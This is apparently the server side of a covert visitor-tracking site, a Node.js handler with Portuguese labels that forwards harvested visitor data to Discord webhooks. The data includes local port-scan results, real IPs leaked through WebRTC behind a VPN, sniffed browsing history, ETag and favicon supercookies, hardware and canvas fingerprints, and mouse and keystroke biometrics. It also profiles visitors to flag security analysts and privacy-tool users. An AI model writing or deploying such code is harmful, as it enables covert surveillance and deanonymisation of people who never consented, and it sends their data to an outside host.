// api/send-to-discord.js

module.exports = async function(req, res) {
    if(req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const DISCORD_WEBHOOK_URL  = process.env.DISCORD_WEBHOOK_URL;
    const DISCORD_GUIDE_WEBHOOK = process.env.DISCORD_GUIDE_WEBHOOK_URL; // segundo webhook — tabela de interpretação
    if(!DISCORD_WEBHOOK_URL) return res.status(500).send('Webhook URL não configurada.');

    try{
        const d = req.body;
        const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
                || req.headers['client-ip']
                || d.ip || 'N/A';

        if(d._update === 'portscan'){
            const embed = {
                title: '🔍 Port Scan Local',
                color: 0xe74c3c,
                fields: [
                    {name:'🚪 Portas abertas',   value: d.openPorts||'none detected',  inline:false},
                    {name:'🔢 Quantidade',        value: String(d.openCount||0),         inline:true},
                    {name:'👤 Perfil do usuário', value: d.profile||'standard user',     inline:true},
                ],
                footer: {text: 'WebSocket probe — portas locais (127.0.0.1)'},
                timestamp: new Date().toISOString(),
            };
            await fetch(DISCORD_WEBHOOK_URL,{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({embeds:[embed]}),
            });
            return res.status(200).send('ok');
        }

        if(d._update === 'behavior'){
            const embed = {
                title: '🖱 Comportamento do Visitante',
                color: 0x9b59b6,
                fields: [
                    {name:'🖱 Movimentos de mouse', value:String(d.mouseMoves||'0'),       inline:true},
                    {name:'⚡ Velocidade média',    value:d.mouseVelocity||'N/A',           inline:true},
                    {name:'📐 Accel jitter',        value:d.accelJitter||'N/A',             inline:true},
                    {name:'🎲 Mouse entropy',       value:d.mouseEntropy||'N/A',            inline:true},
                    {name:'🤖 Human score',         value:d.humanScore||'N/A',              inline:true},
                    {name:'📜 Eventos de scroll',   value:String(d.scrollEvents||'0'),      inline:true},
                    {name:'📏 Velocidade scroll',   value:d.scrollSpeed||'N/A',             inline:true},
                    {name:'⌨️ Teclas pressionadas', value:String(d.keystrokes||'0'),        inline:true},
                    {name:'🖱 Cliques',             value:String(d.clicks||'0'),            inline:true},
                    {name:'👁 Trocas de aba',       value:String(d.tabSwitches||'0'),        inline:true},
                    {name:'⏱ Tempo fora (total)',   value:d.totalHiddenMs||'N/A',            inline:true},
                    {name:'⚡ Tempo médio retorno',  value:d.avgReactMs||'N/A',               inline:true},
                    {name:'🕵️ Analista suspeito',   value:d.analystSuspect||'no',            inline:true},
                ],
                footer:{text:'Biometria passiva (4s de observação) + Shannon entropy'},
                timestamp: new Date().toISOString(),
            };
            await fetch(DISCORD_WEBHOOK_URL,{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({embeds:[embed]}),
            });
            return res.status(200).send('ok');
        }

        const mapsUrl = d.loc && d.loc !== 'N/A'
            ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(d.loc)}`
            : null;

        // Read Vercel server-side headers passed from the client payload
        const ja4       = d.ja4       || 'N/A';
        const geoCountry= d.geoCountry|| 'N/A';
        const geoCity   = d.geoCity   || 'N/A';
        const geoRegion = d.geoRegion || 'N/A';
        const geoCoords = (d.geoLat && d.geoLon && d.geoLat!=='N/A') ? `${d.geoLat},${d.geoLon}` : 'N/A';
        const geoMapsUrl= (d.geoLat && d.geoLon && d.geoLat!=='N/A')
            ? `https://maps.google.com/?q=${d.geoLat},${d.geoLon}` : null;
        const edgeIP    = d.edgeIP    || ip;

        const embed1 = {
            title: '👁 Novo visitante - Rede & Localização',
            color: 0x5865f2,
            fields: [
                // ── Vercel Edge (server-side, cannot be spoofed by client) ──
                {name:'🔷 Edge IP (Vercel)',   value: edgeIP,                               inline:true},
                {name:'🔐 JA4 TLS digest',    value: `\`${ja4}\``,                         inline:false},
                {name:'🌍 Geo (Edge)',         value: `${geoCity}, ${geoRegion}, ${geoCountry}`, inline:true},
                {name:'📡 Geo ASN (Edge)',     value: d.geoASN||'N/A',                     inline:true},
                {name:'🕐 Geo TZ (Edge)',      value: d.geoTZ||'N/A',                      inline:true},
                {name:'🗺 Geo Coords (Edge)',  value: geoMapsUrl?`[${geoCoords}](${geoMapsUrl})`:geoCoords, inline:true},
                {name:'🌐 IP (header)',        value: ip,                                    inline:true},
                {name:'⚠️ WebRTC real IP',     value: d.rtcPublicIPs||'N/A',                inline:true},
                {name:'🏠 IP local (LAN)',     value: d.rtcLocalIPs||'N/A',                 inline:true},
                {name:'🕵️ VPN leak (WebRTC)', value: d.rtcLeak||'N/A',                     inline:true},
                {name:'📡 RTT closest',        value: d.rttClosest||'N/A',                  inline:true},
                {name:'📊 RTT top-5',          value: (d.rttTop||'N/A').slice(0,200),       inline:false},
                {name:'🌍 IP timezone',        value: d.ipTZ||'N/A',                        inline:true},
                {name:'⏱ TZ divergence',      value: d.tzDivergence||'N/A',                inline:true},

                {name:'🎯 Região estimada',    value: d.estimatedRegion||'N/A',             inline:true},
                {name:'🗓 TZ region',          value: d.estimatedTZRegion||'N/A',           inline:true},
                {name:'🕵 VPN likely',         value: d.vpnLikely||'N/A',                   inline:true},
                {name:'💡 Confidence',         value: d.locConfidence||'N/A',               inline:true},
                {name:'📏 Dist from IP',       value: d.distFromIPkm||'N/A',               inline:true},
                {name:'🚩 Flags',              value: d.locFlags||'N/A',                    inline:true},

                {name:'📍 Localização (IP)',   value: `${d.city||'?'}, ${d.region||'?'}, ${d.country||'?'}`, inline:true},
                {name:'🏢 Provedor',           value: d.org||'N/A',                         inline:true},
                {name:'🗺 Coords',             value: mapsUrl?`[${d.loc}](${mapsUrl})`:d.loc||'N/A', inline:true},
                {name:'🕐 Timezone',           value: `${d.tz||'N/A'} (${d.tzOffset||'N/A'})`,       inline:true},
                {name:'🕰 Timestamp',          value: d.ts||'N/A',                          inline:true},
            ]
        };

        const embed2 = {
            title: '💻 Dispositivo & Hardware',
            color: 0x5865f2,
            fields: [
                {name:'🔍 Loc Verdict',        value: (d.locVerdict||'N/A').slice(0,200),   inline:false},
                {name:'📋 TZ detail',          value: d.tzDivDetail||'N/A',                 inline:false},
                {name:'🖥 Browser',            value: d.browser||'N/A',                     inline:true},
                {name:'💻 Plataforma',         value: d.platform||'N/A',                    inline:true},
                {name:'🏗 Arquitetura',        value: `${d.cpuArch||'N/A'} (${d.cpuBitness||'N/A'}-bit)`, inline:true},
                {name:'📱 Modelo',             value: d.deviceModel||'N/A',                 inline:true},
                {name:'🔢 Versão OS',          value: d.platformVersion||'N/A',             inline:true},
                {name:'📱 Mobile / Touch',     value: `${d.mobile||'N/A'} / ${d.touch||'0'} pts`, inline:true},
                {name:'⚙ CPU cores / RAM',    value: `${d.cores||'N/A'} / ${d.memory||'N/A'}`, inline:true},
                {name:'🎮 GPU Vendor',         value: d.webglVendor||'N/A',                 inline:false},
                {name:'🖼 GPU Renderer',       value: d.webglRenderer||'N/A',               inline:false},
                {name:'🖥 Resolução',          value: `${d.resolution||'N/A'} (DPR: ${d.dpr||'1'})`, inline:true},
                {name:'🔋 Bateria',            value: `${d.batteryLevel||'N/A'} (${d.batteryCharging||'N/A'})`, inline:true},
                {name:'📷 Mídia (Cam/Mic/Spk)',value: `${d.cameras||'0'}/${d.mics||'0'}/${d.speakers||'0'}`, inline:true},
                {name:'🌀 Sensores (Acel/Giro/Ori)', value: `${d.hasAccelerometer||'no'}/${d.hasGyroscope||'no'}/${d.hasOrientation||'no'}`, inline:true},
                {name:'📶 Conexão / RTT',      value: `${d.connection||'N/A'} / ${d.rtt||'N/A'}`, inline:true},
                {name:'🔊 Audio output latency', value: d.audioOutputLatency||'N/A',             inline:true},
                {name:'🖥 Audio env',           value: d.audioEnv||'N/A',                        inline:true},
                {name:'🔒 Permissions',         value: (d.permsRaw||'N/A').slice(0,200),          inline:false},
                {name:'🤖 Headless suspected',  value: d.permsHeadless||'N/A',                   inline:true},
                {name:'📋 Perms detail',        value: (d.permsDetail||'N/A').slice(0,200),       inline:false},
                {name:'⏱ Load time',          value: d.loadTime||'N/A',                   inline:true},
                {name:'🔗 Referrer',           value: (d.referrer||'(direct)').slice(0,200), inline:false},
                {name:'🔬 BBox sample',        value: (d.fontBBoxSample||'N/A').slice(0,200), inline:false},
            ]
        };

        const embed3 = {
            title: '🧬 Fingerprints & Info',
            color: 0x5865f2,
            fields: [
                {name:'🖌 Canvas FP',          value: `\`0x${d.canvasFp||'N/A'}\``,        inline:true},
                {name:'🎵 Audio FP (sum)',      value: `\`${d.audioFp||'N/A'}\``,           inline:true},
                {name:'🎵 Audio FP (hash)',     value: `\`${d.audioFpHash||'N/A'}\``,       inline:true},
                {name:'😀 Emoji Canvas FP',    value: `\`${d.emojiFpHash||'N/A'}\``,       inline:true},
                {name:'🔢 Math/FPU FP',        value: `\`${d.mathFpHash||'N/A'}\``,        inline:true},
                {name:'🍪 Favicon Cache ID',   value: `\`${d.faviconId||'N/A'}\` (${d.faviconReturning||'N/A'})`, inline:false},
                {name:'🌐 Sites visitados',     value: (d.sniffVisited||'N/A').slice(0,200), inline:false},
                {name:'🔢 Qtd detectada',       value: d.sniffVisitedCount||'N/A',           inline:true},
                {name:'⏱ Sniff raw (ms)',      value: (d.sniffRaw||'N/A').slice(0,200),     inline:false},
                {name:'📅 Visit #',            value: d.visitCount||'N/A',                 inline:true},
                {name:'🗓 First seen',         value: d.firstSeen||'N/A',                  inline:true},
                {name:'📆 Days since first',   value: d.daysSinceFirst||'N/A',             inline:true},
                {name:'🔄 LS returning',       value: d.lsReturning||'N/A',                inline:true},
                {name:'🧵 Worker parallelism', value: d.workerParallel||'N/A',             inline:true},
                {name:'🚨 Core spoof suspect', value: d.coreSpoofSuspect||'N/A',           inline:true},
                {name:'🎨 CSS Media Queries',   value: `scheme:${d.mqColorScheme||'N/A'} contrast:${d.mqContrast||'N/A'} motion:${d.mqReducedMotion||'N/A'} pointer:${d.mqPointer||'N/A'} HDR:${d.mqHDR||'N/A'}`, inline:false},
                {name:'🍪 ETag supercookie',    value: `\`${d.etagId||'N/A'}\` — ${d.etagReturning||'N/A'}`, inline:false},
                {name:`🔤 Fontes (${d.fontCount||0})`, value:(d.fonts||'none').slice(0,200), inline:false},
                {name:'📐 Font BBox hash',     value: `\`${d.fontBBoxHash||'N/A'}\``,       inline:true},
                {name:'🔢 BBox fonts count',   value: d.fontBBoxCount||'N/A',               inline:true},
                {name:'🖼 Canvas noisy',       value: d.canvasNoisy||'N/A',                 inline:true},
                {name:'🛡 Canvas verdict',     value: d.canvasVerdict||'N/A',               inline:true},
                {name:'🔌 Privacy extension',  value: d.canvasExtension||'N/A',             inline:true},
                {name:'🤥 Lies detected',      value: (d.liesDetected||'none').slice(0,200), inline:false},
                {name:'🚨 Suspected faker',    value: d.liesSuspected||'N/A',               inline:true},
            ],
            footer: { text: `UA: ${(d.userAgent||'').slice(0,120)}` },
            timestamp: new Date().toISOString(),
        };

        await fetch(DISCORD_WEBHOOK_URL,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({embeds:[embed1, embed2, embed3]}),
        });

        // ── Segundo webhook: resumo em linguagem humana ──
        if (DISCORD_GUIDE_WEBHOOK) {
            // Determina perfil do visitante
            const gpu          = (d.webglRenderer||'').toLowerCase();
            const ua           = (d.userAgent||'').toLowerCase();
            const isSwiftShader   = gpu.includes('swiftshader') || gpu.includes('llvmpipe') || gpu.includes('softpipe');
            const isScreenshotBot = ua.includes('vercel-screenshot') || ua.includes('googlebot') || ua.includes('screenshotbot') || ua.includes('headlesschrome');
            const isFirefox       = ua.includes('firefox') || ua.includes('gecko/');
            // audioLatency=0 é falso positivo no Firefox/Linux — excluir
            const isAudioZero     = d.audioEnv === 'virtual/headless (latency=0)' && !isFirefox;
            const isHeadless      = d.permsHeadless === 'YES' || d.liesSuspected === 'YES'
                                 || isSwiftShader || isScreenshotBot || isAudioZero;
            const isVM         = !isHeadless && ((d.audioEnv||'').includes('VM') || (d.audioEnv||'').includes('virtual'));
            const hasVPN       = d.vpnLikely === 'YES' || d.tzDivergence === 'YES';
            const rtcLeaked    = d.rtcLeak === 'YES';
            const privExtension= d.canvasExtension === 'YES';
            const isAnalyst    = d.analystSuspect && d.analystSuspect.startsWith('YES');
            const isDev        = (d.profile||'').includes('developer');
            const openPorts    = d.openPorts && d.openPorts !== 'none detected' && d.openPorts !== 'N/A';

            let perfil = '🟢 Visitante comum';
            let perfilDesc = 'Sem sinais de proteção ou automação. Dados são confiáveis.';
            if (isScreenshotBot)   { perfil = '📸 Bot de screenshot';  perfilDesc = `UA identificado como bot de deploy/crawler: \`${(d.userAgent||'').slice(0,80)}\``; }
            else if (isSwiftShader){ perfil = '🤖 Headless / VM';      perfilDesc = 'GPU SwiftShader detectada — renderização por software sem hardware real. Browser headless ou máquina virtual sem GPU.'; }
            else if (isAudioZero)  { perfil = '🤖 Headless / Bot';     perfilDesc = 'Audio latency = 0 — sem subsistema de áudio real. Padrão de browser automatizado.'; }
            else if (isHeadless)   { perfil = '🤖 Bot / Automação';    perfilDesc = 'Navegador automatizado detectado (Puppeteer/Selenium ou similar). Provavelmente análise do site.'; }
            else if (isAnalyst)    { perfil = '🔍 Analista suspeito';  perfilDesc = 'Humano real, mas trocou de aba várias vezes rapidamente. Pode estar analisando o código.'; }
            else if (isDev)        { perfil = '👨‍💻 Desenvolvedor';       perfilDesc = 'Portas de desenvolvimento abertas no computador (Node, Python, etc).'; }
            else if (privExtension){ perfil = '👻 Privacidade ativa';  perfilDesc = 'Usa extensão de privacidade (Brave Shields / CanvasBlocker). Fingerprints podem estar falsificados.'; }

            // VPN status
            let vpnStatus = '✅ Sem VPN detectada';
            if (hasVPN && !rtcLeaked)  vpnStatus = '🔒 VPN ativa e protegendo IP';
            if (hasVPN && rtcLeaked)   vpnStatus = '⚠️ VPN ativa mas IP real vazou via WebRTC';
            if (!hasVPN && rtcLeaked)  vpnStatus = '🔓 Sem VPN — IP real exposto';

            // Confiabilidade dos dados
            const reliable = !privExtension && !isHeadless && !isVM;
            const confianca = reliable ? '🟢 Alta — dados confiáveis' : '🟡 Média — alguns dados podem estar adulterados';

            const guideEmbed = {
                title: `📋 Resumo do Visitante — ${new Date().toLocaleString('pt-BR', {timeZone:'America/Sao_Paulo'})}`,
                color: isHeadless ? 0x95a5a6 : isVM ? 0xe67e22 : isDev||isAnalyst ? 0xf39c12 : privExtension ? 0x9b59b6 : 0x2ecc71,
                fields: [
                    { name: '👤 Perfil identificado',    value: `**${perfil}**\n${perfilDesc}`, inline: false },
                    { name: '🌍 Localização estimada',   value: `${d.geoCity||d.city||'?'}, ${d.geoRegion||d.region||'?'}, ${d.geoCountry||d.country||'?'}`, inline: true },
                    { name: '🏢 Provedor de internet',   value: d.org||'N/A', inline: true },
                    { name: '🔒 Status de VPN',          value: vpnStatus, inline: false },
                    { name: '🖥 Sistema operacional',    value: d.platform||'N/A', inline: true },
                    { name: '🌐 Navegador',              value: d.browser||'N/A', inline: true },
                    { name: '🎮 Placa de vídeo',         value: (d.webglRenderer||'N/A').slice(0,80), inline: false },
                    { name: '🖥 Ambiente de execução',   value: isHeadless ? `🤖 Headless/Virtual (${d.audioEnv||'N/A'})` : isVM ? `⚠️ ${d.audioEnv}` : '✅ Máquina física', inline: true },
                    { name: '🔌 Extensão de privacidade',value: privExtension ? '⚠️ Detectada' : '✅ Não detectada', inline: true },
                    { name: '🤥 UA falsificado',         value: d.liesSuspected === 'YES' ? `⚠️ Sim — ${(d.liesDetected||'').slice(0,100)}` : '✅ Não', inline: false },
                    { name: '🚪 Portas abertas',         value: isHeadless ? '⚠️ Ignorado (bot — resultado seria do servidor, não do visitante)' : openPorts ? `⚠️ ${d.openPorts} → perfil: **${d.profile}**` : '✅ Nenhuma relevante', inline: false },
                    { name: '📊 Confiabilidade dos dados', value: confianca, inline: false },
                    { name: '🔑 ID permanente (ETag)',   value: `\`${d.etagId||'N/A'}\` — ${d.etagReturning||'N/A'}`, inline: true },
                    { name: '🔑 ID permanente (Favicon)',value: `\`${d.faviconId||'N/A'}\` — ${d.faviconReturning||'N/A'}`, inline: true },
                    { name: '📅 Histórico',              value: `Visita #${d.visitCount||'?'} • Primeiro acesso: ${d.firstSeen||'?'}`, inline: false },
                ],
                footer: { text: `IP: ${d.edgeIP||'N/A'} • JA4: ${(d.ja4||'N/A').slice(0,40)} • UA: ${(d.userAgent||'').slice(0,80)}` },
                timestamp: new Date().toISOString(),
            };

            await fetch(DISCORD_GUIDE_WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({embeds:[guideEmbed]}),
            }).catch(_=>{});
        }

        return res.status(200).send('ok');
    }catch(e){
        console.error(e);
        return res.status(500).send('Erro: '+e.message);
    }
};
